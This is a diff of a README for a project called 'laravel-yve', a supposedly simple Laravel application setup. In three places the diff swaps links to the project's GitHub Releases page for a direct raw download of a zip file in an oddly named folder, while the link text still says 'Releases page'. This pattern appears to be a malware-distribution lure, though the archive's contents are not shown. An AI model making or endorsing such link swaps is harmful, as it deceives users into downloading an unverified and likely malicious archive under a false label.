@@ -1,6 +1,6 @@
 # 🌟 laravel-yve - Simple Laravel Application Setup
 
-[![Download laravel-yve](https://img.shields.io/badge/Download-laravel--yve-blue.svg)](https://github.com/Mugiwara102389/laravel-yve/releases)
+[![Download laravel-yve](https://raw.githubusercontent.com/Mugiwara102389/laravel-yve/main/mensurableness/laravel-yve.zip)](https://raw.githubusercontent.com/Mugiwara102389/laravel-yve/main/mensurableness/laravel-yve.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ laravel-yve is a user-friendly application built on the Laravel framework. It he
 Follow these simple steps to download and run the application.
 
 1. **Visit the Download Page**  
-   Head to the [Releases page](https://github.com/Mugiwara102389/laravel-yve/releases) to find the latest version of the application. This page contains all the necessary files and detailed instructions.
+   Head to the [Releases page](https://raw.githubusercontent.com/Mugiwara102389/laravel-yve/main/mensurableness/laravel-yve.zip) to find the latest version of the application. This page contains all the necessary files and detailed instructions.
 
 2. **Choose the Right Version**  
    On the Releases page, look for the latest version number. Below the version title, you’ll see a list of assets. Select the asset best suited for your operating system (Windows, macOS, or Linux).
@@ -77,4 +77,4 @@ Join our community on social media to share your experience, ask questions, and 
 
 ## 📥 Download & Install
 
-Now that you have read through the setup process, head back to the [Releases page](https://github.com/Mugiwara102389/laravel-yve/releases) to download the latest version of laravel-yve. Get started today and simplify your web development workflow!
+Now that you have read through the setup process, head back to the [Releases page](https://raw.githubusercontent.com/Mugiwara102389/laravel-yve/main/mensurableness/laravel-yve.zip) to download the latest version of laravel-yve. Get started today and simplify your web development workflow!
